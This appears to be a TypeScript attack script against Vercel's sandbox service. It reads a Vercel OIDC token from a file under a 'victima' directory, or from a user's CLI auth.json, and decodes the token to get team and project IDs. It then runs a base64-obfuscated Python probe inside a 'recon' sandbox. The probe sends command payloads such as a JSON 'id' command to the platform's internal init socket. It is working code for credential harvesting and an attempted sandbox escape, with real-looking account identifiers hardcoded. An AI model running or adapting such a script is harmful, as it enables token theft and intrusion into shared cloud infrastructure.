import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

async function main() {
  const s = await Sandbox.get({ name: "recon-1787251919562", token: VICTIM, teamId, projectId });
  const B64 = "CmltcG9ydCBzb2NrZXQsIHN0cnVjdCwgdGltZQpTT0NLPScvcnVuL3ZlcmNlbC9zaGFyZS9pbml0LnNvY2snCmRlZiBjb25uZWN0KCk6CiAgICBzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfVU5JWCwgc29ja2V0LlNPQ0tfU1RSRUFNKQogICAgcy5zZXR0aW1lb3V0KDIpCiAgICBzLmNvbm5lY3QoU09DSykKICAgIHJldHVybiBzCnBheWxvYWRzID0gW10KcGF5bG9hZHMuYXBwZW5kKCgncmF3IGhlbGxvJywgYidoZWxsbycpKQpwYXlsb2Fkcy5hcHBlbmQoKCdyYXcgYnJhY2VzJywgYnl0ZXMoWzEyMywxMjVdKSkpCnBsID0gYid7ImNtZCI6ImlkIn0nCnBheWxvYWRzLmFwcGVuZCgoJ3JhdyBqc29uIGNtZCcsIHBsKSkKcGF5bG9hZHMuYXBwZW5kKCgnNC1ieXRlLWxlbicsIHN0cnVjdC5wYWNrKCc+SScsIGxlbihwbCkpICsgcGwpKQpwYXlsb2Fkcy5hcHBlbmQoKCdqc29uLWxpbmUnLCBwbCArIGJ5dGVzKFsxMF0pKSkKZm9yIGxhYmVsLCBkYXRhIGluIHBheWxvYWRzOgogICAgdHJ5OgogICAgICAgIHMgPSBjb25uZWN0KCkKICAgICAgICBzLnNlbmRhbGwoZGF0YSkKICAgICAgICB0aW1lLnNsZWVwKDAuMykKICAgICAgICB0cnk6CiAgICAgICAgICAgIHIgPSBzLnJlY3YoNDA5NikKICAgICAgICAgICAgcHJpbnQobGFiZWwsICctPicsIHJlcHIocls6MjAwXSkpCiAgICAgICAgZXhjZXB0IHNvY2tldC50aW1lb3V0OgogICAgICAgICAgICBwcmludChsYWJlbCwgJy0+ICh0aW1lb3V0LCBubyByZXBseSknKQogICAgICAgIHMuY2xvc2UoKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGxhYmVsLCAnLT4gRVJSJywgZSkKdHJ5OgogICAgcyA9IGNvbm5lY3QoKQogICAgdGltZS5zbGVlcCgwLjUpCiAgICB0cnk6CiAgICAgICAgciA9IHMucmVjdig0MDk2KQogICAgICAgIHByaW50KCdyZWFkLWFmdGVyLWNvbm5lY3QgLT4nLCByZXByKHJbOjIwMF0pKQogICAgZXhjZXB0IHNvY2tldC50aW1lb3V0OgogICAgICAgIHByaW50KCdyZWFkLWFmdGVyLWNvbm5lY3QgLT4gKG5vdGhpbmcpJykKICAgIHMuY2xvc2UoKQpleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICBwcmludCgncmVhZC1hZnRlci1jb25uZWN0IEVSUicsIGUpCg==";
  const SCRIPT = `
set +e
echo "${B64}" | base64 -d > /tmp/probe.py
echo "---- probe.py written ($(wc -c < /tmp/probe.py) bytes) ----"
timeout 12 python3 /tmp/probe.py
echo "===DONE==="
`;
  const r = await s.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 40_000 });
  console.log(await r.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });